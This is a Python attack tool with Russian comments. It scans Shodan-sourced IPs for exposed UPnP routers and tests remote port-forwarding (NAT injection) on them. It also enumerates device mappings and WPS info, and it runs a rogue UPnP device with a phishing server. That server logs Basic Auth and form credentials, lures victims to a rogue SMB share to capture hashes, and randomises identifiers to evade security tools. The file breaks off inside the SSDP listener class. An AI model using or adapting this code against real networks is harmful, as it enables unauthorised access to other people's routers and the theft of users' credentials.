#!/usr/bin/env python3

import os
import re
import socket
import base64
import struct
import random
import signal
import requests
import xml.etree.ElementTree as ET

from bs4 import BeautifulSoup
from multiprocessing import Process
from string import Template
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
from argparse import ArgumentParser
from ipaddress import ip_address
from email.utils import formatdate
from urllib.parse import urlparse, urljoin


# Вспомогательный метод для обработки передаваемых программе аргументов
def get_arguments():
    parser = ArgumentParser()
    # аргументы, используемые при работе с UPnP
    parser.add_argument('-i', '--input', type=str,
                        help='File with target hosts for scanning')
    parser.add_argument('-c', '--country', type=str,
                        help='Country to scan')
    parser.add_argument('-o', '--output', type=str,
                        help='File with urls to xml configurations')
    parser.add_argument('-d', '--discover', action='store_true',
                        help='Discover UPnP locations')
    parser.add_argument('-pf', '--port_forwarding', action='store_true',
                        help='Make TCP bind over NAT')

    # аргументы, используемые при работе с мошенническим UPnP-устройством
    parser.add_argument('-ru', '--rogue_upnp', action='store_true',
                        help='Create rogue UPNP device on a local network')
    parser.add_argument('-s', '--smb', type=str, action='store',
                        help=('IP address of rogue SMB server. The IP address '
                              'of the passed interface is set by default'))
    parser.add_argument('interface', type=str, action='store',
                        help='Network interface used for listening')
    parser.add_argument('-p', '--port', type=int, action='store',
                        default=3333,
                        help='Port used by HTTP server. Default is 3333')
    parser.add_argument('-t', '--template', type=str, action='store',
                        default='office365',
                        help=('Name of a folder in the templates directory. '
                              'Default is "office365". This will define used '
                              'xml and phishing pages'))
    parser.add_argument('-b', '--basic', action="store_true",
                        default=False,
                        help=('Enable base64 authentication for templates and '
                              'write credentials to log file'))
    # в соответствии с RFC 2617 https://datatracker.ietf.org/doc/html/rfc2617#page-3
    # realm аттрибут требуется для всех схем аутентификации. 
    # В сочетании с каноническим корневым URL-адресом сервера, к которому осуществляется доступ, аттрибут realm 
    # определяет пространство защиты. 
    # Эти области позволяют разделить защищенные ресурсы на сервере на набор областей защиты, 
    # каждая со своей собственной схемой аутентификации и/или базой данных авторизации. 
    # Значение области представляет собой строку, обычно назначаемую исходным сервером, к
    # оторая может иметь дополнительную семантику, характерную для схемы аутентификации.
    #  
    # Таким образом, страницы в одной области должны иметь общие учетные данные. 
    # Если учетные данные работают для страницы с областью «My Realm», то следует предположить, 
    # что та же комбинация имени пользователя и пароля должна работать для другой страницы с той же областью.
    parser.add_argument("-a", "--realm", type=str, action='store',
                        default='Microsoft Corporation',
                        help='Realm when prompting target for authentication '
                        'via Basic Auth')
    parser.add_argument("-u", "--url", type=str,
                        default='',
                        help=('Redirect to provided URL. Works with templates '
                              'that do a POST for logon forms and with '
                              'templates that include the custom redirect JS'
                              '[example: -u https://google.com]'))
    args = parser.parse_args()

    args.template_dir = (os.path.dirname(os.path.abspath(__file__))
                         + '/templates/' + args.template)
    args.is_auth = args.basic
    args.realm = args.realm
    args.redirect_url = args.url

    if not os.path.isdir(args.template_dir):
        exit('\n[!] Provided template directory doesn\'t exist')
    return args


# Метод для загрузки 100 IP-адресов для выбранной страны
def get_vuln_ips(country):
    if os.geteuid() != 0:
        exit('Root priveleges required')
    print('\033[96m' + '---------------------------\n' + 
          ' Obtaining IP addresses with open \n 1900 port in the specified country\r\n' + 
          '---------------------------')
    os.system(f'''shodan download --limit 100 {country} "port:1900 \
        country:{country}"''')
    os.system(f"shodan parse {country}.json.gz --fields ip_str > \
        {country}.txt")


# Вспомогательный метод для извлечения списка адресов из файла
def get_ips_from_file(hosts_file):
    with open(hosts_file, "r", encoding="utf-8") as file:
        return [line.strip() for line in file]


# Метод для получения удаленного доступа к TCP-службе,
# связанной с компьютером жертвы, в обход трансляции сетевых адресов (NAT)
#
# Аргумент input_file содержит список URL адресов, полученных в методе discover_upnp_locations. 
# Результатом работы метода является файл port_forward_output.txt, содержащий адреса устройств, уязвимых к NAT-инъекции
def port_forwarding(input_file):
    print('\033[96m' + '---------------------------\n' + 'Port forwarding\r\n' +'---------------------------')
    with open(input_file, "r", encoding="utf-8") as file:
        for line in file:
            ip = line.strip().split(':')[1]
            port = line.strip().split(':')[2].split('/')[0]
            ip_with_port = ip + ':' + port

            try:
                soup = BeautifulSoup(requests.get(line.strip(), timeout=1).text, 'lxml')
                controlurl = soup.find('devicelist').find('devicelist').find('controlurl').get_text()
                local_IP = soup.find('presentationurl').get_text()[7:18]
                SOAP_add_action_header = { 'Soapaction' : '"' + 'rn:schemas-upnp-org:services:WANIPConnection:1#AddPortMapping' + '"',
                     'Content-type' : 'text/xml; charset="utf-8"',
                     'Connection' : 'close' }

                SOAP_delete_action_header = { 'Soapaction' : '"' + 'rn:schemas-upnp-org:services:WANIPConnection:1#DeletePortMapping' + '"',
                         'Content-type' : 'text/xml; charset="utf-8"',
                         'Connection' : 'close' }

                payload = ('<?xml version="1.0" encoding="utf-8" standalone="yes"?>' +
                           '<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">' +
                           '<s:Body>' +
                           '<u:AddPortMapping xmlns:u="' + "urn:schemas-upnp-org:services:WANIPConnection:1" + '">' +
                           '<NewRemoteHost></NewRemoteHost>' +
                           '<NewExternalPort>5555</NewExternalPort>' +
                           f"<NewInternalClient>{local_IP}</NewInternalClient>" +
                           '<NewInternalPort>80</NewInternalPort>'+
                           '<NewProtocol>TCP</NewProtocol>' +
                           '<NewPortMappingDescription>test</NewPortMappingDescription>' +
                           '<NewLeaseDuration>10</NewLeaseDuration>' +
                           '<NewEnabled>1</NewEnabled>' +
                           '</u:AddPortMapping>' +
                           '</s:Body>' +
                           '</s:Envelope>')

                resp = requests.post(f"http:{ip_with_port}{controlurl}",
                        data=payload, headers=SOAP_add_action_header, timeout=1)
                if resp.status_code != 200:
                    print('\033[92m' + '[-] http:' + ip + ' is not vulnerable for port forwarding')
                else:
                    print('\u001b[36m' + '[+] http:' + ip + ' is vulnerable for port forwarding')
                    with open('port_forward_output.txt', "a", encoding="utf-8") as f:
                        f.write(ip[2:] + '\n')

                resp = requests.post(f"http:{ip_with_port}{controlurl}",
                        data=payload, headers=SOAP_delete_action_header)                
            except Exception:
                print('\033[92m' + '[-] http:' + ip + ' is not vulnerable for port forwarding')
                continue
    try:
        f = open('port_forward_output.txt')
        print('\u001b[33m' + '---------------------------\n See port_forward_output.txt file to see hosts vulnerable for port forwarding\n' + '---------------------------')
    except FileNotFoundError:
        print('\u001b[36m' + '---------------------------\n No hosts vulnerable for port forwarding has been found\n' + '---------------------------')


# Метод отправляет на широковещательный адрес 239.255.255.250 
# сообщение Simple Service Discovery Protocol (SSDP) M-SEARCH через UDP-порт 1900.
# Устройство с поддержкой UPnP ответит одноадресным сообщением SSDP, содеращим URI параметра
# LOCATION, к которому можно обратиться для получения дополнительной информации
#
# Аргумент hosts_file содержит список сканируемых адресов устройств
# Аргумент output_file используется для записи адресов устройств,
# имеющих открытую xml-конфигурацию
def discover_upnp_locations(hosts_file, output_file):
    print('\033[92m' + '---------------------------\n Discovering upnp locations\r\n---------------------------')
    location_regex = re.compile("location:[ ]*(.+)\r\n", re.IGNORECASE)
    port_and_xml_regex = re.compile(":\d{1,5}/.{1,25}", re.IGNORECASE)
    SSDP_discover = ('M-SEARCH * HTTP/1.1\r\n' +
                    'HOST: 239.255.255.250:1900\r\n' +
                    'MAN: "ssdp:discover"\r\n' +
                    'MX: 1\r\n' +
                    'ST: ssdp:all\r\n' +
                    '\r\n')

    hosts = get_ips_from_file(hosts_file)
    locations = set()
    for host in hosts:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(SSDP_discover.encode('ASCII'), (host, 1900))
            sock.settimeout(1)
            data, addr = sock.recvfrom(1024)  # размер буфера равен 1024 байтам
            location_result = location_regex.search(data.decode('ASCII'))
            if location_result is None or \
                    port_and_xml_regex.search(location_result.group(1)) is None:
                print('[-] ' + host + ' : ' + 'has no location')
                continue

            fullUrl = 'http://' + host + port_and_xml_regex.search(location_result.group(1)).group(0)
            print('\u001b[36m' + '[+] ' + host + ' : ' + 'location is accessible')
            locations.add(fullUrl)
            with open(output_file, "a", encoding="utf-8") as f:
                f.write(fullUrl + '\n')
        except socket.error:
            print('\033[92m' + '[-] ' + host + ' : ' + 'location is not accessible')
            continue

    print('---------------------------\n Discovery complete\n--------------------------')
    print('\u001b[36m' + '[+] %d locations found:' % len(locations))
    for location in locations:
        print('\t-> %s' % location)
    print('---------------------------')
    parse_locations(locations)
    print('\u001b[33m' + '---------------------------\n' + 'see ' + output_file + ' file to see hosts with open xml configurations\r\n' +'---------------------------')


# Вспомогательный метод для отображения атрибутов XML-конфигурации устройства
#
# Аргумент xml содержит обрабатываемую xml-конфигурацию
# Аргумент xml_service содержит название обрабатываемого xml-сервиса
# Аргумент print_name содержит возвращаемое методом название обработанного xml-сервиса
def print_attribute(xml, xml_service, print_name):
    try:
        temp = xml.find(xml_service).text
        print('\t-> %s: %s' % (print_name, temp))
    except AttributeError:
        return

    return


# Вспомогательный метод для вывода информации о пути XML-конфигураций
def print_control_and_service(ctrl, service):
    print('\t\t=> URL to IGD control API: %s' % ctrl)
    print('\t\t=> Service Type: %s' % service)


# Метод загружает XML-конфигурацию и распечатывает информацию об устройстве,
# такую как тип программного обеспечения, его версию, используемых сервисах и
# URL-адреса интерфейса управления.
#
# Аргумент locations содержит список URL-адресов, содержащих XML-конфигурации устройств
def parse_locations(locations):
    if len(locations) > 0:
        for location in locations:
            print('\u001B[37m' + '[+] Loading %s...' % location)
            try:
                resp = requests.get(location, timeout=2)
                if resp.headers.get('server'):
                    print('\t-> Server String: %s' % resp.headers.get('server'))
                else:
                    print('\t-> No server string')

                parsed = urlparse(location)

                print('\t==== XML Attributes ===')
                try:
                    xml_root = ET.fromstring(resp.text)
                    # В большинстве случаев root_tag принимает значение {urn:schemas-upnp-org:device-1-0}
                    root_tag = re.sub('root$', '', xml_root.tag)
                except Exception:
                    print('\t[!] Failed to parse the response XML of %s' % location + '\n---------------------------')
                    continue

                print_attribute(xml_root, './' + root_tag + 'device/' + root_tag + 'deviceType', 'Device Type')
                print_attribute(xml_root, './' + root_tag + 'device/' + root_tag + 'friendlyName', 'Friendly Name')
                print_attribute(xml_root, './' + root_tag + 'device/' + root_tag + 'manufacturer', 'Manufacturer')
                print_attribute(xml_root, './' + root_tag + 'device/' + root_tag + 'manufacturerURL', 'Manufacturer URL')
                print_attribute(xml_root, './' + root_tag + 'device/' + root_tag + 'modelDescription', 'Model Description')
                print_attribute(xml_root, './' + root_tag + 'device/' + root_tag + 'modelName', 'Model Name')
                print_attribute(xml_root, './' + root_tag + 'device/' + root_tag + 'modelNumber', 'Model Number')
                print_attribute(xml_root, './' + root_tag + 'device/' + root_tag + 'serialNumber', 'Serial Number')

                igd_ctr = ''
                igd_service = ''
                cd_ctr = ''
                cd_service = ''
                wps_ctr = ''
                wps_service = ''

                print('\t-> Services:')
                services = xml_root.findall('.//*' + root_tag + 'serviceList/')
                for service in services:
                    print('\t\t=> Service Type: %s' % service.find('./' + root_tag + 'serviceType').text)
                    print('\t\t=> Control: %s' % service.find('./' + root_tag + 'controlURL').text)
                    print('\t\t=> Events: %s' % service.find('./' + root_tag + 'eventSubURL').text)

                    # Добавляется символ '/', если его нет в начале SCP
                    scp = service.find('./' + root_tag + 'SCPDURL').text
                    service_URL = urljoin(parsed.scheme + '://' + parsed.netloc, scp)
                    print('\t\t=> API: %s' % service_URL)

                    # чтение SCP XML
                    try:
                        resp = requests.get(service_URL, timeout=1)
                    except requests.exceptions.ConnectionError:
                        print('[!] Could not load %s' % service_URL)
                        continue
                    except requests.exceptions.ReadTimeout:
                        print('[!] Timeout reading from %s' % service_URL)
                        continue
                    
                    # В начале некоторых XML-конфигураций умной розетки Belkin WeMo есть нечитаемые символы
                    belkin_strip = u'^\xef\xbb\xbf'
                    try:
                        service_XML = ET.fromstring(re.sub(belkin_strip, '', resp.text))
                    except Exception:
                        print('\t\t\t[!] Failed to parse the response XML')
                        continue

                    actions = service_XML.findall(".//*{urn:schemas-upnp-org:service-1-0}action")
                    common_service = service.find('./' + root_tag + 'serviceType').text

                    for action in actions:
                        required_action = action.find('./{urn:schemas-upnp-org:service-1-0}name').text
                        print('\t\t\t- ' + required_action)
                        if required_action == 'AddPortMapping':
                            scp = service.find('./' + root_tag + 'controlURL').text
                            igd_ctr = service_URL
                            igd_service = common_service
                        elif required_action == 'Browse':
                            scp = service.find('./' + root_tag + 'controlURL').text
                            cd_ctr = service_URL
                            cd_service = common_service
                        elif required_action == 'GetDeviceInfo':
                            scp = service.find('./' + root_tag + 'controlURL').text
                            wps_ctr = service_URL
                            wps_service = common_service

                if igd_ctr and igd_service:
                    print('\t[+] IGD port mapping available. Looking up current mappings...')
                    print_control_and_service(igd_ctr, igd_service)
                    find_port_mappings(igd_ctr, igd_service)

                if cd_ctr and cd_service:
                    print('\t[+] Content browsing available. Looking up base directories...')
                    print_control_and_service(cd_ctr, cd_service)
                    find_directories(cd_ctr, cd_service) 

                if wps_ctr and wps_service:
                    print('\t[+] M1 available. Looking up device information...')
                    print_control_and_service(wps_ctr, wps_service)
                    find_device_info(wps_ctr, wps_service)
                print('---------------------------')

            except requests.exceptions.ConnectionError:
                print('[!] Could not load service URL for %s' % location + '\n---------------------------')
                continue
            except requests.exceptions.ReadTimeout:
                print('[!] Timeout reading from %s' % location)
                continue
            except requests.exceptions.InvalidSchema:
                print('[!] Invalid schema %s' % location)
                continue
            except Exception as e:
                print(e)
                continue
    return


# Метод находит уже существующие сопоставления внешних и внутренних портов.
# Эта логика предполагает, что сопоставления находятся в списке, по которому мы можем пройти циклом.
# Обход списка прекращается при получении первого ответа от сервера, отличающегося от 200 OK.
#
# Аргумент p_url содержит URL, используемый для отправки SOAPAction
# Аргумент p_service содержит имя службы, отвечающей за управляющий URI
def find_port_mappings(p_url, p_service):
    index = 0
    while True:
        payload = ('<?xml version="1.0" encoding="utf-8" standalone="yes"?>' +
                   '<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">' +
                   '<s:Body>' +
                   '<u:GetGenericPortMappingEntry xmlns:u="' + p_service + '">' +
                   '<NewPortMappingIndex>' + str(index) + '</NewPortMappingIndex>' +
                   '</u:GetGenericPortMappingEntry>' +
                   '</s:Body>' +
                   '</s:Envelope>')

        SOAP_action_header = { 'Soapaction' : '"' + p_service + '#GetGenericPortMappingEntry' + '"',
                             'Content-type' : 'text/xml;charset="utf-8"' }
        resp = requests.post(p_url, data=payload, headers=SOAP_action_header)

        if resp.status_code != 200:
            if index == 0:
                print('\t[!] No existing port mappings found')
            return
        else:
            try:
                xml_root = ET.fromstring(resp.text)
            except Exception:
                print('\t\t[!] Failed to parse the response XML')
                return

            external_IP = xml_root.find(".//*NewRemoteHost").text
            if external_IP == None:
                external_IP = '*'

            print('\t\t[%s] %s:%s => %s:%s | Desc: %s' % (xml_root.find(".//*NewProtocol").text,
                external_IP, xml_root.find(".//*NewExternalPort").text,
                xml_root.find(".//*NewInternalClient").text, xml_root.find(".//*NewInternalPort").text,
                xml_root.find(".//*NewPortMappingDescription").text))

        index += 1
    

# Метод отправляет запрос «Browse» для каталога верхнего уровня.
# Далее выводит на экран обнаруженные контейнеры верхнего уровня.
# Их количество было ограничено до 10 с помощью параметра <RequestedCount> в запроссе.
#
# Аргумент p_url содержит URL для отправки SOAPAction
# Аргумент p_service содержит имя службы, отвечающей за управляющий URI
def find_directories(p_url, p_service):
    payload = ('<?xml version="1.0" encoding="utf-8" standalone="yes"?>' +
               '<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">' +
               '<s:Body>' +
               '<u:Browse xmlns:u="' + p_service + '">' +
               '<ObjectID>0</ObjectID>' +
               '<BrowseFlag>BrowseDirectChildren</BrowseFlag>' +
               '<Filter>*</Filter>' +
               '<StartingIndex>0</StartingIndex>' +
               '<RequestedCount>10</RequestedCount>' +
               '<SortCriteria></SortCriteria>' +
               '</u:Browse>' +
               '</s:Body>' +
               '</s:Envelope>')

    SOAP_action_header = { 'Soapaction' : '"' + p_service + '#Browse' + '"',
                         'Content-type' : 'text/xml;charset="utf-8"' }

    resp = requests.post(p_url, data=payload, headers=SOAP_action_header)
    if resp.status_code != 200:
        print('\t\tRequest failed with status: %d' % resp.status_code)
        return

    try:
        xml_root = ET.fromstring(resp.text)
        containers = xml_root.find(".//*Result").text
        if not containers:
            return

        xml_root = ET.fromstring(containers)
        containers = xml_root.findall("./{urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/}container")
        for container in containers:
            if container.find("./{urn:schemas-upnp-org:metadata-1-0/upnp/}class").text.find("object.container") > -1:
                print("\t\tStorage Folder: " + container.find("./{http://purl.org/dc/elements/1.1/}title").text)
    except Exception:
        print('\t\t[!] Failed to parse the response XML')


# Метод отправляет запрос «GetDeviceInfo», который в ответ получит WPS-сообщение M1. 
# Это сообщение имеет формат TLV. 
# После чего распечатывает полученные типы/значения.
#
# Аргумент p_url  содержит URL для отправки SOAPAction
# Аргумент p_service содержит имя службы, отвечающей за управляющий URI
def find_device_info(p_url, p_service):
    payload = ('<?xml version="1.0" encoding="utf-8" standalone="yes"?>' +
               '<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">' +
               '<s:Body>' +
               '<u:GetDeviceInfo xmlns:u="' + p_service + '">' +
               '</u:GetDeviceInfo>' +
               '</s:Body>' +
               '</s:Envelope>')

    SOAP_action_header = { 'Soapaction' : '"' + p_service + '#GetDeviceInfo' + '"',
                         'Content-type' : 'text/xml;charset="utf-8"' }

    resp = requests.post(p_url, data=payload, headers=SOAP_action_header)
    if resp.status_code != 200:
        print('\t[-] Request failed with status: %d' % resp.status_code)
        return

    info_regex = re.compile("<NewDeviceInfo>(.+)</NewDeviceInfo>", re.IGNORECASE|re.DOTALL)
    encoded_info = info_regex.search(resp.text)
    if not encoded_info:
        print('\t[-] Failed to find the device info')
        return

    info = base64.b64decode(encoded_info.group(1))
    while info:
        try:
            type, length = struct.unpack('!HH', info[:4])
            value = struct.unpack('!%is'%length, info[4:4+length])[0]
            info = info[4+length:]

            if type == 0x1023:
                print('\t\tModel Name: %s' % value)
            elif type == 0x1024:
                print('\t\tModel Number: %s' % value)
            elif type == 0x1021:
                print('\t\tManufacturer: %s' % value)
            elif type == 0x1011:
                print('\t\tDevice Name: %s' % value)
            elif type == 0x1020:
                pretty_mac = ':'.join('%02x' % ord(v) for v in value)
                print('\t\tMAC Address: %s' % pretty_mac)
            elif type == 0x1032:
                encoded_pk = base64.b64encode(value)
                print('\t\tPublic Key: %s' % encoded_pk)
            elif type == 0x101a:
                encoded_nonce = base64.b64encode(value)
                print('\t\tNonce: %s' % encoded_nonce)
            elif type == 0x1042:
                print('\t\tSerial Number: %s' % value)
        except: 
            print('[!] TLV parsing failed')
            break


# Метод используется для получения IP-адреса предоставленного интерфейса, 
# который будет использован для обслуживания файлов XML, а также как IP-адрес SMB сервера, 
# если он не указан явно.
def get_ip(interface):
    ip_regexp = r'inet (?:addr:)?(.*?) '
    inet = os.popen('ifconfig ' + interface).read()
    interface_ip = re.findall(ip_regexp, inet)
    try:
        return interface_ip[0]
    except IndexError:
        exit('\033[93m' + '[!] Couldn\'t get IP for provided interface. ')


# Метод выводит на экран баннер при запуске скрипта, информируя пользователя о соответствующих деталях
def print_rogue_upnp_details(args, ip, smb_server):
    device_url = 'http://{}:{}/ssdp/device-desc.xml'.format(
        ip, args.port)
    service_url = 'http://{}:{}/ssdp/service-desc.xml'.format(
        ip, args.port)
    phishing_page_url = 'http://{}:{}/ssdp/index.html'.format(
        ip, args.port)
    # exfil_url = 'http://{}:{}/ssdp/data.dtd'.format(ip, args.port)
    smb_url = 'file://///{}/smb/hash.jpg'.format(smb_server)
    print('\n\n---------------------------')
    print('\033[94m' + '[*] ' + '\033[0m' + 'ROGUE TEMPLATE:           {}'.format(args.template_dir))
    print('\033[94m' + '[*] ' + '\033[0m' + 'MSEARCH LISTENER:        {}'.format(args.interface))
    print('\033[94m' + '[*] ' + '\033[0m' + 'DEVICE DESCRIPTOR:       {}'.format(device_url))
    print('\033[94m' + '[*] ' + '\033[0m' + 'SERVICE DESCRIPTOR:      {}'.format(service_url))
    print('\033[94m' + '[*] ' + '\033[0m' + 'PHISHING PAGE:           {}'.format(phishing_page_url))
    if args.redirect_url:
        print('\033[94m' + '[*] ' + '\033[0m' + "REDIRECT URL:            {}".format(
            args.redirect_url))
    if args.is_auth:
        print('\033[94m' + '[*] ' + '\033[0m' + "AUTH ENABLED, REALM:     {}".format(args.realm))
    # if 'xxe-exfil' in args.template_dir:
    #     print('\033[94m' + "EXFIL PAGE:              {}".format(exfil_url))
    else:
        print('\033[94m' + '[*] ' + '\033[0m' + "SMB POINTER:             {}".format(smb_url))
    # if args.analyze:
    #     print(PC.warn_box + "ANALYZE MODE:            ENABLED")
    print('---------------------------\n\n')


# Метод устанавливает IP-адрес SMB-сервера, который будет использован на фишинговой странице. 
# Скрипт не создает сам SMB-сервер, нужно развернуть собственный, например, с помощью библиотеки Impacket
def set_smb_server_ip(smb, interface_ip):
    if smb:
        if ip_address(smb):
            smb_server_ip = smb
        else:
            exit('\033[93m' + "[!] Invalid IP address for SMB server provided.")
    else:
        smb_server_ip = interface_ip
    return smb_server_ip


def create_rogue_upnp_point(smb_server_ip):
    print('Selected IP: ', smb_server_ip)
    pass

# Класс многопоточного сервера
# Настройка этого определения позволяет обслуживать несколько HTTP-запросов параллельно. 
# Без этого клиентское устройство может навредить работе HTTP-сервера, блокируя
# другие устройства от доступа и анализа XML-файлов.
class MultiThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    pass


# В документации Python3 указано, что следует избегать __init__ в классе BaseHTTPRequestHandler.
# Из-за этого класс создается внутри функции.
# Каждый запрос создает экземпляр нового объекта класса UPNPObject.
def create_class(upnp_args):
    template_dir = upnp_args['template_dir']
    uuid_session = upnp_args['uuid_session']
    smb_server_ip = upnp_args['smb_server_ip']
    redirect_url = upnp_args['redirect_url']
    is_auth = upnp_args['is_auth']
    realm = upnp_args['realm']
    interface_ip = upnp_args['interface_ip']
    port = upnp_args['port']


    # Поддельный объект UPnP
    # Этот класс содержит все объекты и действия, необходимые для поддельного устройства UPnP. 
    # Файлы устройств создаются с использованием переменных, передаеваемых при выполнении команды. 
    # Функции ведения журнала выводят соответствующую информацию на консоль и в файл журнала.
    # Любые запросы к HTTP-серверу, отличные от определенных, будут переданы фишинговой странице. Фишинговая страница может дополнительно запрашивать
    # Фишинговая страница может запросить интерактивный вход в систему, если был указан аргумент "-b / --basic".
    # Фишинговая страница, которую устройства должны запрашивать, называется «index.html»,
    # но запрос на другую страницу также будет обработан.
    class UPNPObject(BaseHTTPRequestHandler):
        @staticmethod
        def create_device_xml():
            # Создает XML-файл дескриптора устройства
            variables = {'interface_ip': interface_ip,
                         'port': port,
                         'smb_server_ip': smb_server_ip,
                         'uuid_session': uuid_session}
            input_file = open(template_dir + '/device.xml')
            template = Template(input_file.read())
            xml_file = template.substitute(variables)
            return xml_file

        @staticmethod
        def create_phish_html():
            # Создает фишинговую страницу, которая открывается, 
            # когда пользователи открывают вредоносное устройство.
            variables = {'smb_server_ip': smb_server_ip,
                         'redirect_url': redirect_url}
            input_file = open(template_dir + '/index.html')
            template = Template(input_file.read())
            phishing_page = template.substitute(variables)
            return phishing_page

        
        # Метод переопределен с целью перехвата исключений закрытого соединения
        def handle(self):
            try:
                BaseHTTPRequestHandler.handle(self)
            except socket.error:
                print('\033[93m [DETECTION]\t {} connected but did not complete a'
                      ' valid HTTP verb. This is sometimes indicitive of a'
                      ' port scan or a detection tool'
                      .format(self.address_string()))

        # Метод переопределен с целью обработки всех GET запросов
        def do_GET(self):
            if self.path == '/ssdp/device-desc.xml':
                # Автоматически анализируется всеми приложениями SSDP
                self.send_response(200)
                self.send_header('Content-type', 'application/xml')
                self.end_headers()
                self.wfile.write(self.create_device_xml().encode())
            elif self.path == '/ssdp/xxe.html':
                # Доступ указывает на уязвимость XXE
                self.send_response(200)
                self.send_header('Content-type', 'application/xml')
                self.end_headers()
                self.wfile.write('.'.encode())
            elif self.path == '/favicon.ico':
                self.send_response(404)
                self.wfile.write('Not found.'.encode())
            else:
                if is_auth:
                    # Если пользователь указал аргумент -b/--basic
                    if 'Authorization' not in self.headers:
                        # Если учетные данные не предоставлены, запросить их
                        self.process_authentication()
                        self.wfile.write("Unauthorized.".encode())
                    elif 'Basic ' in self.headers['Authorization']:
                        # Вернуть фишинговую страницу после предоставления учетных данных
                        self.send_response(200)
                        self.send_header('Content-type', 'text/html')
                        self.end_headers()
                        self.wfile.write(self.create_phish_html().encode())
                    else:
                        self.send_response(500)
                        self.wfile.write("Something happened.".encode())
                elif self.path == '/index.html':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(self.create_phish_html().encode())
                else:
                    # Вернуть фишинговую страницу в ином случае
                    self.send_response(301)
                    self.send_header('Location', '/index.html')
                    self.end_headers()


        # Обрабатывает все POST-запросы. Перезаписывает суперкласс.
        # Обычно POST-сообщения приходят только при использовании шаблонов,
        # которые содержат запрос на вход в систему - фишинг для учетных данных, 
        # передаваемых в незашифрованном виде.
        # Лучше всего использовать их с параметром '-u' для
        # перенаправления на законный URL-адрес после ввода учетных данных. 
        # В противном случае страницу будет просто обновлена
        def do_POST(self):
            if self.path == '/ssdp/do_login.html':
                self.send_response(301)
                if redirect_url:
                    self.send_header('Location', '{}'.format(redirect_url))
                else:
                    self.send_header('Location', 'http://{}:{}/index.html'
                                     .format(interface_ip, port))
                self.end_headers()


        # Запросит у пользователя учетные данные, в результате чего выполнение вернется к
        # функцию do_GET для дальнейшей обработки
        def process_authentication(self):
            self.send_response(401)
            self.send_header('WWW-Authenticate', 'Basic realm=\"{}\"'
                             .format(realm))
            self.send_header('Content-type', 'text/html')
            self.end_headers()
        
        # Добавляет учетные данные, предоставленные через базовую аутентификацию, 
        # а также через уязвимости XXE в файл журнала
        @staticmethod
        def add_to_log(data):
            with open('logs_rogue_upnp.txt', 'a') as log:
                timestamp = formatdate(timeval=None, localtime=True,
                                        usegmt=False)
                log.write(timestamp + ":    " + data + "\n")
                log.close()

        # Перезапись встроенной функции, чтобы обеспечить полезную обратную связь внутри
        # текстового интерфейса. Предоставление «User Agent» полезно для определения
        # типов устройств, взаимодействующих с мошенническим UPnP-устройством.
        # Наиболее важные вещи (отправленные учетные данные и XXE уязвимости)
        # регистрируется в текстовом файле в рабочем каталоге с помощью метода add_to_log
        def log_message(self, format, *args):
            address = self.address_string()
            agent = self.headers['user-agent']
            verb = self.command
            path = self.path

            if 'xml' in self.path:
                print('\033[92m  [XML REQUEST]  Host: {}, User-Agent: {}'
                      .format(address, agent))
                print("               {} {}".format(verb, path))

            elif 'xxe.html' in self.path:
                data = '\033[91m [XXE FOUND!] Host: {}, User-Agent: {}\n'.format(
                    address, agent)
                data += "               {} {}".format(verb, path)
                print(data)
                self.add_to_log(data)
            elif 'do_login' in self.path:
                content_length = int(self.headers['Content-Length'])
                post_body = self.rfile.read(content_length)
                credentials = post_body.decode('utf-8')
                data = '\033[91m  [CREDS GIVEN] HOST: {}, FORM-POST CREDS: {}'.format(
                    address, credentials)
                print(data)
                self.add_to_log(data)
            elif 'index.html' in self.path:
                print('\033[91m [PHISH WORKED] Host: {}, User-Agent: {}'.format(
                    address, agent))
                print("               {} {}".format(verb, path))
            elif 'favicon.ico' in self.path:
                return

            else:
                print('\033[93m [DETECTION]\t Odd HTTP request from Host: {}, \
                      UserAgent: {}'.format(address, agent))
                print('               {} {}'.format(verb, path))
                print('               ... sending to phishing page.')

            if 'Authorization' in self.headers:
                encoded = self.headers['Authorization'].split(' ')[1]
                plaintext = base64.b64decode(encoded).decode()
                data = '\033[91m  [CREDS GIVEN] HOST: {}, BASIC-AUTH CREDS: {}'.format(
                    address, plaintext)
                print(data)
                self.add_to_log(data)

    return UPNPObject


# Прослушиватель многоадресной рассылки UDP для SSDP-запросов.
# Объект этого класса будет привязан к адресу и порту многоадресной рассылки, определенной спецификацией SSDP.
# После чего пользователь может получить данные от созданного объекта, который будет захватывать
# многоадресный UDP-трафик в локальной сети. 
# Обработка осуществляется в функции main() ниже.
class SSDP_sniffer:
    # def __init__(self, interface_ip, port, analyze):
    def __init__(self, interface_ip, port):
        self.sock = None
        self.hosts = []
        self.interface_ip = interface_ip
        self.port = port
        # self.analyze_mode = analyze
        ssdp_port = 1900
        multicast_address = '239.255.255.250'
        server_address = ('', ssdp_port)

        # Нижеследующее регулярное выражение используется для идентификации 
        # явно ложных запросов, исходящих из средств защиты
        self.valid_request = re.compile(r'^[a-zA-Z0-9.\-_]+:[a-zA-Z0-9.\-_:]+$')

        # Получение нового уникального UUID идентификатора используется для
        # обхода средств защиты
        self.uuid_session = ('uuid:'
                            + self.gen_random(8) + '-'
                            + self.gen_random(4) + '-'
                            + self.gen_random(4) + '-'
                            + self.gen_random(4) + '-'
                            + self.gen_random(12))

        # Инициализация сокета
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Привязка к адресу сервера
        self.sock.bind(server_address)

        # Указываем операционной системе добавить сокет в
        # группу многоадресной рассылки для выбранного IP.
        group = socket.inet_aton(multicast_address)
        mult_req = struct.pack('4s4s', group, socket.inet_aton(self.interface_ip))
        self.sock.setsockopt(
            socket.IPPROTO_IP,
            socket.IP_ADD_MEMBERSHIP,
            mult_req)

